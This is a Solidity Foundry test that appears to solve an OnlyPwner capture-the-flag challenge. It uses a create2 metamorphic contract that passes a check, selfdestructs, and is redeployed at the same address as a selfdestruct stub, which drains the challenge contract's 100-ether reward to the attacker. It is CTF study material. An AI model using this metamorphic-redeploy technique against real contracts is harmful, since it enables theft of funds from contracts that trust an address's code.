// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "./Stunt.sol";

/// https://onlypwner.xyz/challenges/8
/// https://github.com/Bobface/onlypwner-challenges/tree/dev/challenges/bobface-shapeshifter
contract Attempt {
    function first() public pure returns (bytes32 result) {
        result = hex"deadbeef";
    }

    function second() public pure returns (bytes32 result) {
        result = hex"c0ffeebabe";
    }

    function third() public pure returns (bytes32 result) {
        result = hex"1337";
    }

    function destroy(address payable receiver) public {
        selfdestruct(receiver);
    }
}

contract Metamorphic {
    /// @dev Using immutable to access it in runtime code
    Stunt internal immutable _stunt;

    constructor(Stunt stunt_) {
        _stunt = stunt_;
    }

    fallback(bytes calldata) external returns (bytes memory code) {
        if (_stunt.solved(address(this))) {
            // selfdestruct(tx.origin)
            code = hex"32FF";
        } else {
            code = type(Attempt).runtimeCode;
        }
    }
}

contract Factory {
    Metamorphic internal _metamorphic;

    constructor(Stunt stunt_) {
        _metamorphic = new Metamorphic(stunt_);
    }

    function deployMetamorphic() external returns (address) {
        return _deployContract(address(_metamorphic).code);
    }

    function _deployContract(bytes memory code) internal returns (address addr) {
        assembly {
            addr := create2(0, add(code, 0x20), mload(code), 0x0)
        }
    }
}

contract StuntTest is Test {
    Stunt internal _stunt;
    Factory internal _factory;

    function setUp() public {
        _stunt = new Stunt{value: 101 ether}();
        _factory = new Factory(_stunt);

        // Deploying the contract using create2 to generate the same contract address.
        // The runtime code is identical to Attempt contract
        address metamorphic = _factory.deployMetamorphic();

        _stunt.attempt(metamorphic);

        // selfdestruct and redeploying must occur in separate transactions
        Attempt(metamorphic).destroy(payable(address(0)));
    }

    function test_attack() public {
        (address attacker, uint256 attackerKey) = makeAddrAndKey("attacker");

        vm.startBroadcast(attackerKey);

        // Redeploying the contract with the same contract address,
        // but the runtime code is 32FF.
        address metamorphic = _factory.deployMetamorphic();

        // The reward will be sent to tx.origin due to selfdestruct
        _stunt.claimReward(metamorphic);

        vm.stopBroadcast();

        assertGe(address(attacker).balance, 100e18, "attacker balance");
    }
}
